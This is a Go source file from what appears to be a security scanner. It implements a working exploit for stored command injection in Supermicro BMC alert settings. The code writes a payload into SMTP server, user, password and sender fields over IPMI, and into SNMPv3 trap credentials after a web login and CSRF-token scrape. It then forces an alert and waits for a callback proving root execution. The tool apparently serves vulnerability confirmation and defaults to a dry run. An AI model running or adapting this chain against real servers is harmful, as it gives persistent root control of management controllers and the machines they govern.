package cmd

// SMC-0022: two ATEN libipmi.so alert-delivery subsystems concatenate stored,
// administrator-supplied configuration strings into an outbound shell command
// and run it as root when an alert fires. `smc-alert-cmdinj` drives both sinks and
// confirms execution out of band.
//
//   - smtp: OEMGetSetSMTPSetting (NetFn 0x30 / Cmd 0x68 / subfn 0x06) stores the
//     server, user, password and sender; SMTPClientSend formats them into the
//     /bin/msmtp command line with --host/--user/--from unquoted and runs it
//     through popen. X10 4.00 stores every field verbatim; X13 and H13SSF store
//     only the server field without escaping.
//   - snmp: the web handler cgilib_config_snmp stores the SNMPv3 trap username
//     with no filter (and the passwords behind only an unchanged-password
//     placeholder check); PETSnmpTrapV3 formats them into the /sbin/snmptrap
//     command (unquoted, via a /bin/sh -c wrapper) and an snmpget engine probe.
//
// Both sinks are blind. The confirmation is a callback to a local listener,
// forced by the PEF Alert Immediate command (NetFn 0x04 / Cmd 0x16) for the
// SMTP path; the payloads also write a marker file.
//
// Without --apply the run is a staged dry run: it reads state and prints the
// exact requests it would send, and transmits no setter, POST, or trigger.

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// smc0022markerDefault is the marker path used when --marker is empty.
const smc0022markerDefault = "/tmp/oobscan_marker"

// ---- report ----

type smc0022FieldResult struct {
	Sink      string `json:"sink"`
	Field     string `json:"field"`
	FieldID   string `json:"fieldID"`
	Request   string `json:"requestHex,omitempty"`
	SetCC     string `json:"setCompletionCode,omitempty"`
	Readback  string `json:"readback,omitempty"`
	Stored    bool   `json:"stored"`
	Attempted bool   `json:"attempted"`
	Note      string `json:"note,omitempty"`
}

type smc0022Report struct {
	Finding    string `json:"finding"`
	Host       string `json:"host"`
	Port       int    `json:"port"`
	Generation string `json:"smcGeneration,omitempty"`
	Model      string `json:"smcModel,omitempty"`
	Firmware   string `json:"firmware,omitempty"`

	Sink          string `json:"sink"`
	Apply         bool   `json:"apply"`
	InjectedValue string `json:"injectedValue"`
	CallbackURL   string `json:"callbackURL,omitempty"`
	MarkerPath    string `json:"markerPath,omitempty"`

	Fields []smc0022FieldResult `json:"fields,omitempty"`

	SNMPSet      string `json:"snmpSetReply,omitempty"`
	SNMPStored   bool   `json:"snmpStored"`
	SNMPFormPath string `json:"snmpFormPath,omitempty"`
	SNMPReadback string `json:"snmpReadback,omitempty"`

	Trigger          string `json:"trigger,omitempty"`
	TriggerAttempted bool   `json:"triggerAttempted"`
	TriggerCC        string `json:"triggerCompletionCode,omitempty"`

	Confirmed      bool   `json:"confirmed"`
	CallbackRemote string `json:"callbackRemote,omitempty"`
	CallbackPath   string `json:"callbackPath,omitempty"`

	Verdict string   `json:"verdict"`
	Impact  string   `json:"impact"`
	Notes   []string `json:"notes,omitempty"`
}

func newSMC0022Report(host string) *smc0022Report {
	return &smc0022Report{
		Finding: "SMC-0022",
		Host:    host,
		Port:    ipmiPort,
		Impact: "An authenticated IPMI Administrator executes arbitrary commands as the operating-system root user on the BMC. " +
			"The value persists in the alert delivery configuration and runs on every matching alert, not only on the trigger used to confirm it.",
		Notes: []string{
			"This is a STORED injection: the value is written into the alert-delivery configuration and executes at the moment the BMC sends the corresponding alert. The IPMI Alert Immediate command is only a convenient way to force an alert; the same payload runs on any matching sensor event.",
			"Which fields are injectable depends on the generation. X10 4.00 stores the SMTP server, user, password and sender with no validation; X13 2401MS 01.07.01 and H13SSF E401MS 01.09.16 store the server field without the escaping the X11 build applies (and require System Lockdown off, which is the default). The SNMPv3 trap username has no validation at all on the generations that ship the snmptrap path.",
			"Neither response is an oracle: the trigger arms the alert on a timer and returns immediately, so the confirmation is the callback (or the marker file), never the reply timing or contents.",
		},
	}
}

// runIPMISMC0022 drives the selected alert-delivery sink or sinks.
func runIPMISMC0022(ctx context.Context, sess *ipmi.CmdSess, _ []string) (any, error) {
	host := sess.Host()
	rep := newSMC0022Report(host)
	rep.Apply = smcApply

	sink, err := parseSMC0022Sink(smc0022Sink)
	if err != nil {
		return rep, err
	}
	rep.Sink = sink

	if g, gerr := sess.SMCGeneration(ctx); gerr == nil && g != nil {
		rep.Generation, rep.Model = g.Generation, g.ModelPrefix
	}
	if fw, ferr := sess.SMCDeviceGeneration(ctx); ferr == nil {
		rep.Firmware = fw
	}
	if rep.Generation != "" && !ipmi.SMCCmdInj0022Generation(rep.Generation) {
		return rep, fmt.Errorf("generation %q (%s) is not on the SMC-0022 surface: the alert-configuration injection class covers X10 through X13 and H13. X14 runs OpenBMC (see smc-x14-cmdinj) and X9 has no reachable setter for either sink", rep.Generation, rep.Model)
	}

	marker := strings.TrimSpace(smcCmdInjMarker)
	if marker == "" {
		marker = smc0022markerDefault
	}
	payload, err := ipmi.SMCCmdInjPayload(marker, "")
	if err != nil {
		return rep, err
	}
	rep.MarkerPath = marker

	// The callback listener is needed the moment the run can inject, and it is
	// also what the payload URL is built from, so bind it before the payload is
	// finalised.
	var cb *ipmi.SMCCallbackServer
	if smcApply {
		cb, err = startSMCCallback(host)
		if err != nil {
			return rep, err
		}
		defer cb.Close()
	}
	if cb != nil {
		rep.CallbackURL = cb.URL()
		if payload, err = ipmi.SMCCmdInjPayload(marker, cb.URL()); err != nil {
			return rep, err
		}
	}
	rep.InjectedValue = payload

	if sink == "smtp" || sink == "both" {
		fields, ferr := runSMC0022SMTP(sess, payload)
		if ferr != nil {
			return rep, ferr
		}
		rep.Fields = fields
	}
	if sink == "snmp" || sink == "both" {
		if serr := runSMC0022SNMP(ctx, rep, payload); serr != nil {
			return rep, serr
		}
	}

	// Nothing was injected, so nothing can be confirmed.
	if !smcApply {
		rep.Verdict = "staged (dry run): state read and requests rendered, nothing transmitted"
		return rep, nil
	}

	stored := smc0022AnyStored(rep)
	triggerNote := "the store side accepted the injected value"
	if !stored {
		triggerNote = "NO store side accepted the injected value, so an alert cannot carry it"
	}

	// Fire the alert. Only the SMTP sink goes through the PEF Alert Immediate
	// trigger; the SNMP sink needs an actual v3 trap, which the trigger arms only
	// when a v3 trap destination is fully configured.
	if sink == "smtp" || sink == "both" {
		if terr := fireSMC0022Alert(sess, rep); terr != nil {
			return rep, terr
		}
	}

	if cb != nil {
		if hit, ok := cb.Wait(smc0022AlertWait); ok {
			rep.Confirmed = true
			rep.CallbackRemote, rep.CallbackPath = hit.RemoteAddr, hit.Path
			rep.Verdict = "CONFIRMED: an alert-delivery sink ran the injected command as root and called back"
			return rep, nil
		}
	}
	rep.Verdict = "NOT CONFIRMED: no callback arrived"
	rep.Notes = append(rep.Notes, fmt.Sprintf("no request reached the callback listener within %s. %s. For the SNMP sink the trigger alone is not enough: PETSnmpTrapV3 only runs when a v3 trap is actually dispatched, which needs a configured and enabled v3 trap destination. For the SMTP sink the alert path is timer-driven, so an unconfirmed run is not a negative - read the marker (%s) on the target if that path is reachable.", smc0022AlertWait, triggerNote, marker))
	return rep, nil
}

func smc0022AnyStored(rep *smc0022Report) bool {
	if rep.SNMPStored {
		return true
	}
	for _, f := range rep.Fields {
		if f.Stored {
			return true
		}
	}
	return false
}

// parseSMC0022Sink normalizes the --sink value.
func parseSMC0022Sink(v string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "", "both":
		return "both", nil
	case "smtp", "snmp":
		return strings.ToLower(strings.TrimSpace(v)), nil
	default:
		return "", fmt.Errorf("unsupported --sink %q (want smtp|snmp|both)", v)
	}
}

// runSMC0022SMTP drives the OEM IPMI SMTP setter for each selected field and
// returns per-field results. It reads each field before writing it, so the
// report shows what was there, and reads it back after, so a build that accepts
// the set but rewrites or truncates the value is not mistaken for a stored one.
func runSMC0022SMTP(sess *ipmi.CmdSess, payload string) ([]smc0022FieldResult, error) {
	ids, err := parseSMC0022Fields(smc0022Fields)
	if err != nil {
		return nil, err
	}
	out := make([]smc0022FieldResult, 0, len(ids))
	// Read the current value of every selected field first, so the run reports
	// what it is about to overwrite before it overwrites it.
	for _, id := range ids {
		d, _ := ipmi.SMCSMTPFieldByID(id)
		before, cc, gerr := sess.SMCSMTPGet(id)
		res := smc0022FieldResult{
			Sink:    "smtp",
			Field:   d.Name,
			FieldID: fmt.Sprintf("0x%02x", id),
		}
		if gerr == nil && cc == 0x00 {
			res.Readback = before
		}
		req, rerr := ipmi.SMCSMTPRequest(ipmi.SMCSMTPOpSet, id, payload)
		if rerr != nil {
			return nil, rerr
		}
		res.Request = hexBytes(req)
		out = append(out, res)
	}

	if !smcApply {
		for i := range out {
			out[i].Note = "staged: not sent"
		}
		return out, nil
	}

	for i := range out {
		id := ids[i]
		cc, serr := sess.SMCSMTPSet(id, payload)
		if serr != nil {
			out[i].Note = fmt.Sprintf("transport error: %v", serr)
			continue
		}
		out[i].Attempted = true
		out[i].SetCC = fmt.Sprintf("0x%02x", cc)
		switch cc {
		case 0x00:
			// Read back, which is what separates "stored" from "accepted but
			// rewritten/truncated" on a setter that does apply a filter.
			rb, rcc, rerr := sess.SMCSMTPGet(id)
			switch {
			case rerr != nil:
				out[i].Note = fmt.Sprintf("set accepted but readback failed: %v", rerr)
				out[i].Stored = true
			case rcc != 0x00:
				out[i].Note = fmt.Sprintf("set accepted but readback cc=0x%02x", rcc)
			default:
				out[i].Readback = rb
				out[i].Stored = rb == payload
				if !out[i].Stored {
					out[i].Note = "stored value differs from the injected value (the build rewrote or truncated it)"
				}
			}
		case 0xcc:
			out[i].Note = "rejected with 0xcc: this build validates the field (X11 escapes every field; X12, X13-DAI and H13 answer the OEM setter with a stub), so it is not injectable here"
		case 0xd4:
			out[i].Note = "refused 0xd4: the session is below Administrator, or System Lockdown is on"
		default:
			out[i].Note = fmt.Sprintf("refused with cc=0x%02x", cc)
		}
	}
	return out, nil
}

// parseSMC0022Fields resolves the --smtp-fields list to field IDs.
func parseSMC0022Fields(v string) ([]byte, error) {
	names := csvFields(v)
	if len(names) == 0 {
		names = []string{"server"}
	}
	out := make([]byte, 0, len(names))
	for _, n := range names {
		var id byte
		switch strings.ToLower(n) {
		case "server", "host":
			id = 0x01
		case "user", "username":
			id = 0x03
		case "password", "pass":
			id = 0x04
		case "sender", "from":
			id = 0x05
		default:
			return nil, fmt.Errorf("unknown SMTP field %q (want server, user, password, sender)", n)
		}
		out = append(out, id)
	}
	return out, nil
}

// runSMC0022SNMP stores the injection in the SNMPv3 trap username through the
// ATEN web UI, obtaining a session and the page CSRF token first.
func runSMC0022SNMP(ctx context.Context, rep *smc0022Report, payload string) error {
	if rep.Generation != "" && !ipmi.SMCCmdInj0022SNMPSink(rep.Generation) {
		rep.Notes = append(rep.Notes, fmt.Sprintf("the SNMPv3 trap-credential sink is absent on generation %s (X10 stores the v3 credentials but sends traps with an in-process encoder and never executes /sbin/snmptrap, so the credentials never reach a shell)", rep.Generation))
		return nil
	}
	form := ipmi.SMCWebSNMPForm(ipmi.SMCWebSNMPCredentials{
		Username: payload,
		AuthPass: payload,
		PrivPass: payload,
	})
	rep.SNMPFormPath = writeSMCArtifact(rep.Host, "snmpv3-config_snmp.form", form)
	if !smcApply {
		rep.SNMPSet = "staged: not sent"
		return nil
	}

	user := smc0022WebUser
	pass := smc0022WebPass
	if strings.TrimSpace(pass) == "" {
		pass = ipmiPassword
	}
	if strings.TrimSpace(user) == "" {
		return fmt.Errorf("the SNMPv3 sink needs the web UI credential: pass --web-user and --web-pass (or -P)")
	}

	scheme := strings.ToLower(strings.TrimSpace(smc0022WebScheme))
	if scheme != "http" && scheme != "https" {
		return fmt.Errorf("unsupported --web-scheme %q (want https or http)", smc0022WebScheme)
	}
	port := smc0022WebPort
	if port <= 0 {
		if scheme == "https" {
			port = 443
		} else {
			port = 80
		}
	}
	base := fmt.Sprintf("%s://%s", scheme, netHostPort(rep.Host, port))
	client := httpx.Client(15 * time.Second)

	sid, err := smcWebLogin(ctx, client, base, user, pass)
	if err != nil {
		rep.SNMPSet = fmt.Sprintf("web login failed: %v", err)
		return nil
	}
	// The ATEN op.cgi dispatch requires the anti-CSRF token the authenticated
	// page embeds; it rejects the POST without it.
	token := smcWebCSRFToken(ctx, client, base, sid)
	if token == "" {
		rep.SNMPSet = "authenticated, but no CSRF token was found on the page; the op.cgi POST would be rejected"
		return nil
	}
	status, body, err := smcWebPostOp(ctx, client, base, sid, token, form)
	if err != nil {
		rep.SNMPSet = fmt.Sprintf("op.cgi POST failed: %v", err)
		return nil
	}
	body = strings.TrimSpace(body)
	rep.SNMPSet = fmt.Sprintf("HTTP %d %s", status, body)
	rep.SNMPStored = status == http.StatusOK && !strings.Contains(strings.ToLower(body), "fail") && !strings.Contains(strings.ToLower(body), "error")
	if rep.SNMPStored {
		rep.SNMPReadback = "the handler answered without rejecting, which is the store-side confirmation for the unfiltered v3 fields"
	}
	return nil
}

// fireSMC0022Alert issues the PEF Alert Immediate trigger.
func fireSMC0022Alert(sess *ipmi.CmdSess, rep *smc0022Report) error {
	channel, destination := byte(smc0022Channel), byte(smc0022Destination)
	cc, err := sess.SMCAlertImmediate(channel, destination, -1)
	rep.TriggerAttempted = true
	rep.Trigger = fmt.Sprintf("raw 0x04 0x16 0x%02x 0x%02x", channel, destination)
	if err != nil {
		rep.TriggerCC = fmt.Sprintf("transport error: %v", err)
		return nil
	}
	rep.TriggerCC = fmt.Sprintf("0x%02x", cc)
	return nil
}

// ---- ATEN web helpers (login, CSRF token, op.cgi) ----

// smcWebLogin posts to /cgi/login.cgi and returns the minted SID. The ATEN build
// base64-encodes the credentials server-side behind check=00 on X11+, while
// earlier firmware reads them verbatim, so both encodings are tried.
func smcWebLogin(ctx context.Context, client *http.Client, base, user, pass string) (string, error) {
	encodings := []struct {
		enc   func(string) string
		check bool
	}{
		{func(s string) string { return s }, false},
		{func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }, true},
	}
	var lastErr error
	for _, e := range encodings {
		form := url.Values{"name": {e.enc(user)}, "pwd": {e.enc(pass)}}
		if e.check {
			form.Set("check", "00")
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/cgi/login.cgi", strings.NewReader(form.Encode()))
		if err != nil {
			return "", err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 8192))
		_ = resp.Body.Close()
		for _, c := range resp.Cookies() {
			if strings.EqualFold(c.Name, "SID") && strings.TrimSpace(c.Value) != "" && c.Value != "0" {
				return c.Value, nil
			}
		}
		lastErr = fmt.Errorf("HTTP %d with no SID cookie", resp.StatusCode)
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no SID cookie")
	}
	return "", lastErr
}

// smcWebCSRFToken fetches the authenticated management page and extracts the
// CSRF token the ATEN stack embeds with SmcCsrfInsert("CSRF-TOKEN", ...).
func smcWebCSRFToken(ctx context.Context, client *http.Client, base, sid string) string {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/cgi/url_redirect.cgi?url_name=topmenu", nil)
	if err != nil {
		return ""
	}
	req.AddCookie(&http.Cookie{Name: "SID", Value: sid})
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	_ = resp.Body.Close()
	return parseSMCWebCSRFToken(string(body))
}

// parseSMCWebCSRFToken pulls the token out of either SmcCsrfInsert spelling the
// generations use, or a plain hidden form field.
func parseSMCWebCSRFToken(body string) string {
	for _, marker := range []string{`SmcCsrfInsert("CSRF-TOKEN",`, `SmcCsrfInsert("CSRF_TOKEN",`} {
		_, after, ok := strings.Cut(body, marker)
		if !ok {
			continue
		}
		after = strings.TrimLeft(after, " \t")
		if !strings.HasPrefix(after, `"`) {
			continue
		}
		after = after[1:]
		val, _, ok := strings.Cut(after, `"`)
		if ok && strings.TrimSpace(val) != "" {
			return strings.TrimSpace(val)
		}
	}
	// A hidden field fallback, for a page that renders the token as a form input.
	_, after, ok := strings.Cut(strings.ToLower(body), `name="csrf_token"`)
	if ok {
		if _, rest, ok2 := strings.Cut(after, `value="`); ok2 {
			val, _, ok3 := strings.Cut(rest, `"`)
			if ok3 {
				return strings.TrimSpace(val)
			}
		}
	}
	return ""
}

// smcWebPostOp POSTs one op.cgi operation with the session cookie and the
// CSRF-TOKEN header.
func smcWebPostOp(ctx context.Context, client *http.Client, base, sid, token string, body []byte) (int, string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/cgi/op.cgi", bytes.NewReader(body))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("CSRF-TOKEN", token)
	req.AddCookie(&http.Cookie{Name: "SID", Value: sid})
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	out, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return resp.StatusCode, string(out), nil
}

// netHostPort renders host:port, bracketing an IPv6 literal.
func netHostPort(host string, port int) string {
	if strings.Contains(host, ":") && !strings.HasPrefix(host, "[") {
		return fmt.Sprintf("[%s]:%d", host, port)
	}
	return fmt.Sprintf("%s:%d", host, port)
}

// hexBytes renders request bytes as a space-separated hex string, matching the
// `raw` argument form so a printed request can be replayed verbatim.
func hexBytes(b []byte) string {
	parts := make([]string, 0, len(b))
	for _, x := range b {
		parts = append(parts, fmt.Sprintf("0x%02x", x))
	}
	return strings.Join(parts, " ")
}

// SMCPrintTable renders the report through the shared session-backed path, so
// `smc-alert-cmdinj` honors --format and prints a table by default like every other
// smc-* command.
func (r *smc0022Report) SMCPrintTable(w io.Writer) error { return printSMC0022Table(w, r) }

func printSMC0022Table(w interface{ Write([]byte) (int, error) }, r *smc0022Report) error {
	fmt.Fprintf(w, "HOST=%s PORT=%d FINDING=%s\n", r.Host, r.Port, r.Finding)
	if r.Generation != "" || r.Firmware != "" {
		fmt.Fprintf(w, "TARGET: generation=%s model=%s firmware=%s\n", orNone(r.Generation), orNone(r.Model), orNone(r.Firmware))
	}
	fmt.Fprintf(w, "SINK=%s MODE=%s\n", r.Sink, map[bool]string{true: "apply", false: "staged dry run"}[r.Apply])
	fmt.Fprintf(w, "INJECTED VALUE: %s\n", sanitizeASCII(r.InjectedValue))
	if r.CallbackURL != "" {
		fmt.Fprintf(w, "CALLBACK URL: %s\n", r.CallbackURL)
	}
	if r.MarkerPath != "" {
		fmt.Fprintf(w, "MARKER PATH: %s (id(1) output; not read back by this run)\n", r.MarkerPath)
	}

	if len(r.Fields) > 0 {
		rows := make([][]string, 0, len(r.Fields))
		for _, f := range r.Fields {
			var note = f.Note
			if note == "" && f.Stored {
				note = "stored verbatim (readback matches the injected value)"
			}
			rows = append(rows, []string{f.Field, f.FieldID, f.SetCC, boolWord(f.Stored), truncateCell(f.Readback, 48), note})
		}
		fmt.Fprintln(w, "SMTP SETTER (OEM 0x30/0x68 subfn 0x06):")
		if err := writeASCIITable(w, []string{"Field", "ID", "Set CC", "Stored", "Readback", "Note"}, rows); err != nil {
			return err
		}
		for _, f := range r.Fields {
			if f.Request != "" {
				fmt.Fprintf(w, "  request (%s): raw 0x30 0x68 %s\n", f.Field, f.Request)
			}
		}
	}

	if r.SNMPFormPath != "" || r.SNMPSet != "" {
		fmt.Fprintln(w, "SNMPv3 SETTER (web cgilib_config_snmp):")
		fmt.Fprintf(w, "  config_snmp POST : %s\n", orNone(r.SNMPSet))
		if r.SNMPFormPath != "" {
			fmt.Fprintf(w, "  form body saved  : %s\n", r.SNMPFormPath)
		}
		fmt.Fprintf(w, "  store-side ok    : %t\n", r.SNMPStored)
		if r.SNMPReadback != "" {
			fmt.Fprintf(w, "  note             : %s\n", r.SNMPReadback)
		}
	}

	if r.TriggerAttempted {
		fmt.Fprintf(w, "ALERT TRIGGER: %s -> %s\n", r.Trigger, r.TriggerCC)
	}
	if r.Confirmed {
		fmt.Fprintf(w, "CALLBACK: received from %s path=%s\n", r.CallbackRemote, r.CallbackPath)
	}
	fmt.Fprintf(w, "VERDICT: %s\n", r.Verdict)
	fmt.Fprintf(w, "IMPACT: %s\n", r.Impact)
	for _, n := range r.Notes {
		fmt.Fprintf(w, "NOTE: %s\n", n)
	}
	return nil
}

// truncateCell shortens a readback value for a table cell, marking the cut.
func truncateCell(s string, max int) string {
	s = sanitizeASCII(s)
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
